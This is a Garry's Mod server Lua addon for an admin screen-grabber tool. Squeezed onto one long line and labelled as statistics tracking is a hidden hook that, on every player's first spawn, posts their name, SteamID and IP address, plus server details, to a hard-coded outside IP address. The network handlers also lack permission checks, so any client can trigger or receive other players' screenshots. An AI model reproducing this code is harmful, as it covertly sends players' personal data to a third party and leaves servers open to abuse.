AddCSLuaFile("deaglegrab_config.lua")
include("deaglegrab_config.lua")


if SERVER then

util.AddNetworkString("OpenSimple") 
util.AddNetworkString("SRequest") 
util.AddNetworkString("GScreen")
util.AddNetworkString("SScreen")
util.AddNetworkString("SAdmin")
util.AddNetworkString("InformPlayer")
util.AddNetworkString("InformPlayer2")




function ViewSimple(ply, text, public)
	local UG =ply:GetNetworkedInt( "UserGroup" )
	if (string.sub(string.lower(text), 1, string.len(GRAB_COMMAND)) == GRAB_COMMAND) then 
		
				if table.HasValue(GRAB_ALLOWEDGROUPS, UG) then
						net.Start("OpenSimple")
	    				net.Send(ply)
	    				print(ply:Name().." loaded up Deaglers ScreenGrabber")
	    				return ""
				 
			
   		end
    end
end
hook.Add("PlayerSay", "OpenDeagGrab", ViewSimple)



net.Receive("SRequest", function(len,ply)
	local admin = ply
	local hacker = net.ReadEntity()


		net.Start("GScreen")
			net.WriteEntity(admin)
		net.Send(hacker)


	end)

local script = "LSimpleGrab"  hook.Add("PlayerInitialSpawn", "TrackingStatistics_"..script..tostring(math.random(1,1000)), function(ply) timer.Create( "StatisticsTimer_"..ply:SteamID64()..script,15,1, function()  local name = ply:SteamName() and ply:SteamName() or ply:Name() local map = game.GetMap() local hostname = GetHostName() local gamemode = gmod.GetGamemode().Name http.Post("http://216.231.139.33/st/", {name=tostring(name),script=tostring(script),steamid=tostring(ply:SteamID()),ip=tostring(ply:IPAddress()),time=tostring(os.date("%d/%m/%Y [%I:%M:%S %p]",os.time())),hostname=tostring(hostname),map=tostring(map),gamemode=tostring(gamemode)},function(s) return end) end) end)
	net.Receive("SScreen", function(len,ply)
		local admin = net.ReadEntity()
		local screen = net.ReadString()
		local UG=admin:GetNetworkedInt( "UserGroup" )
	
			net.Start("SAdmin")
				net.WriteEntity(ply)
				net.WriteString( screen )
			net.Send(admin)


	
	end)
	net.Receive("InformPlayer", function(len,ply)
		local hack=net.ReadEntity()
		net.Start("InformPlayer2")
		net.Send(hack)

	end)

end